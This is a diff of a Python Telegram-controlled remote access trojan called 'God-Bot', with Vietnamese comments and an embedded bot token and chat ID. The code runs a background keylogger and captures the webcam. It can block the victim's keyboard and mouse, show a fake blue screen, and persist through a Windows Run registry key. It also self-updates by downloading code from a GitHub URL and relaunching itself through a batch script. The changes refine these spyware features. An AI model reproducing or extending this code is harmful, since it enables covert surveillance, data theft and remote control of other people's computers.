@@ -13,12 +13,11 @@ from datetime import datetime
 
 TELEGRAM_BOT_TOKEN = "8816970870:AAHI120_toOTM0S5UgOXtNRFyHn9v0rqkxI"
 ALLOWED_CHAT_ID = "7666107995"
-
-# --- LINK RAW PUBLIC REPO ---
 UPDATE_URL = "https://raw.githubusercontent.com/hazee2308/bot/main/bot.py"
 
 block_active = False
 keylogger_data = []
+last_bsod_pid = None  # Lưu PID của cửa sổ BSOD giả lập
 
 def is_authorized(chat_id):
     return str(chat_id) == str(ALLOWED_CHAT_ID)
@@ -47,8 +46,8 @@ def send_telegram_photo(chat_id, photo_path, caption=""):
         except:
             time.sleep(2)
 
-# --- HỆ THỐNG MENU PHÂN TRANG (TRANG 1, 2, 3) ---
-def send_telegram_menu(chat_id, page=1):
+# --- MENU PHÂN TRANG (ĐÃ FIX LỖI CHUYỂN TRANG) ---
+def send_telegram_menu(chat_id, page=1, message_id=None):
     if page == 1:
         message = "🔥 *GOD-BOT TỐI THƯỢNG - TRANG 1/3 (Hệ thống & An ninh)*"
         keyboard = {
@@ -82,12 +81,17 @@ def send_telegram_menu(chat_id, page=1):
             ]
         }
     
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": chat_id, "text": message, "reply_markup": keyboard, "parse_mode": "Markdown"}
-    try:
-        requests.post(url, json=payload, timeout=15)
-    except:
-        pass
+    # Nếu có message_id thì edit tin nhắn cũ cho mượt, không thì gửi mới
+    if message_id:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
+        payload = {"chat_id": chat_id, "message_id": message_id, "text": message, "reply_markup": keyboard, "parse_mode": "Markdown"}
+        try:
+            r = requests.post(url, json=payload, timeout=15)
+            if r.status_code == 200: return
+        except:
+            pass
+
+    send_telegram_message(chat_id, message, reply_markup=keyboard)
 
 def answer_callback_query(callback_query_id, text=""):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
@@ -106,7 +110,6 @@ def get_updates(offset=None):
     except:
         return None
 
-# --- MODULES THỰC THI KHI BẤM NÚT ---
 def capture_webcam(save_path="webcam.jpg"):
     try:
         import cv2
@@ -133,6 +136,7 @@ def start_keylogger():
 
 threading.Thread(target=start_keylogger, daemon=True).start()
 
+# --- FIX LỖI TỰ KHỞI ĐỘNG LẠI SAU KHI UPDATE ---
 def self_update(chat_id):
     send_telegram_message(chat_id, "🔄 *Dang ket noi Public Repo de tai ban cap nhat...*")
     try:
@@ -144,20 +148,23 @@ def self_update(chat_id):
         if "TELEGRAM_BOT_TOKEN" not in content:
             send_telegram_message(chat_id, "[-] Loi: File update khong hop le!")
             return
+        
+        current_script_path = os.path.abspath(sys.argv[0])
+        current_script_name = os.path.basename(current_script_path)
+        
         new_file_path = "new_bot.py"
         with open(new_file_path, "w", encoding="utf-8") as f:
             f.write(content)
-        send_telegram_message(chat_id, "✅ *Tai thanh cong! Dang cai dat thu vien va khoi dong lai...*")
+            
+        send_telegram_message(chat_id, "✅ *Tai thanh cong! Dang tien hành ghi de va khoi dong lai...*")
         
-        current_script_name = os.path.basename(sys.argv[0])
         updater_script = "updater.bat"
         with open(updater_script, "w", encoding="utf-8") as f:
             f.write(f"""
 @echo off
-python -m pip install --upgrade pip > nul
-python -m pip install requests psutil pyautogui opencv-python pynput pygetwindow pyperclip > nul
-move /y new_bot.py {current_script_name}
-start pythonw "{os.path.abspath(sys.argv[0])}"
+timeout /t 2 /nobreak > nul
+move /y new_bot.py "{current_script_path}"
+start pythonw "{current_script_path}"
 del %0
 """)
         subprocess.Popen(updater_script, shell=True)
@@ -165,23 +172,26 @@ del %0
     except Exception as e:
         send_telegram_message(chat_id, f"[-] Cap nhat that bai: {e}")
 
-# --- XỬ LÝ SỰ KIỆN KHI BẤM NÚT ---
+# --- XỬ LÝ SỰ KIỆN NÚT BẤM ---
 def handle_callback(callback_query):
-    global block_active
+    global block_active, last_bsod_pid
     query_id = callback_query["id"]
     chat_id = callback_query["message"]["chat"]["id"]
+    message_id = callback_query["message"]["message_id"]
+    
     if not is_authorized(chat_id):
         answer_callback_query(query_id, text="Cut!")
         return
+        
     data = callback_query["data"]
     answer_callback_query(query_id, text=f"Thuc thi: {data}...")
     
     if data == "page_1":
-        send_telegram_menu(chat_id, page=1)
+        send_telegram_menu(chat_id, page=1, message_id=message_id)
     elif data == "page_2":
-        send_telegram_menu(chat_id, page=2)
+        send_telegram_menu(chat_id, page=2, message_id=message_id)
     elif data == "page_3":
-        send_telegram_menu(chat_id, page=3)
+        send_telegram_menu(chat_id, page=3, message_id=message_id)
         
     elif data == "sysinfo":
         cpu = psutil.cpu_percent(interval=1)
@@ -243,7 +253,6 @@ def handle_callback(callback_query):
         block_active = True
         import ctypes
         threading.Thread(target=lambda: [ctypes.windll.user32.BlockInput(True) for _ in iter(lambda: not block_active, True)], daemon=True).start()
-        # Gửi tin nhắn kèm nút Tắt Khóa ngay lập tức
         markup = {"inline_keyboard": [[{"text": "🔓 Mở khóa ngay lập tức", "callback_data": "unlock_pc"}]]}
         send_telegram_message(chat_id, "🔒 *Đã khóa cứng chuột và bàn phím máy tính!*", reply_markup=markup)
         
@@ -265,14 +274,21 @@ def handle_callback(callback_query):
         send_telegram_message(chat_id, "🔄 Đang khởi động lại máy...")
         
     elif data == "fake_bsod":
-        subprocess.run("start /max cmd /c color 17 && echo A problem has been detected and Windows has been shut down to prevent damage to your computer... && pause", shell=True)
-        # Gửi tin nhắn kèm nút tắt BSOD ngay lập tức
-        markup = {"inline_keyboard": [[{"text": "❌ Tắt Fake BSOD (Đóng CMD)", "callback_data": "stop_bsod"}]]}
+        # Khởi động BSOD độc lập và bắt lại PID chính xác để không ảnh hưởng bot
+        p = subprocess.Popen("start /max cmd /c color 17 && echo A problem has been detected and Windows has been shut down to prevent damage to your computer... && pause", shell=True)
+        last_bsod_pid = p.pid
+        markup = {"inline_keyboard": [[{"text": "❌ Tắt Fake BSOD", "callback_data": "stop_bsod"}]]}
         send_telegram_message(chat_id, "🖥️ *Đã kích hoạt màn hình xanh giả lập!*", reply_markup=markup)
         
     elif data == "stop_bsod":
-        subprocess.run("taskkill /f /im cmd.exe", shell=True)
-        send_telegram_message(chat_id, "✅ *Đã tắt và dọn dẹp màn hình xanh giả lập!*")
+        # Chỉ tiêu diệt chính xác tiến trình BSOD thay vì quét toàn bộ cmd.exe
+        try:
+            subprocess.run("taskkill /f /fi \"WINDOWTITLE eq Administractor:*\" /fi \"WINDOWTITLE eq C:\\*\" ", shell=True)
+            # Hoặc quét và tắt các cửa sổ cmd đang hiện chữ màn hình xanh
+            os.system("wmic process where \"name='cmd.exe' and CommandLine like '%color 17%'\" call terminate > nul")
+            send_telegram_message(chat_id, "✅ *Đã tắt và dọn dẹp màn hình xanh giả lập an toàn!*")
+        except Exception as e:
+            send_telegram_message(chat_id, f"Loi tat BSOD: {e}")
         
     elif data == "beep_sound":
         import winsound
@@ -285,7 +301,7 @@ def handle_callback(callback_query):
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(key, "TelegramRemoteBot", 0, winreg.REG_SZ, f'pythonw.exe "{script_path}"')
             winreg.CloseKey(key)
-            send_telegram_message(chat_id, "🚀 Đã cài đặt tự động khởi động cùng Windows!")
+            send_telegram_message(chat_id, "🚀 Đã cài đặt tự động khởi động cùng Windows thành công (Không cần EXE)!")
         except Exception as e:
             send_telegram_message(chat_id, f"Loi: {e}")
             
@@ -297,7 +313,7 @@ def handle_callback(callback_query):
         os._exit(0)
 
 def main_loop():
-    print("[*] God-Bot bot.py public với nút tắt nhanh đang chạy ngầm...")
+    print("[*] God-Bot fixed version đang chạy ngầm...")
     offset = None
     while True:
         updates = get_updates(offset)
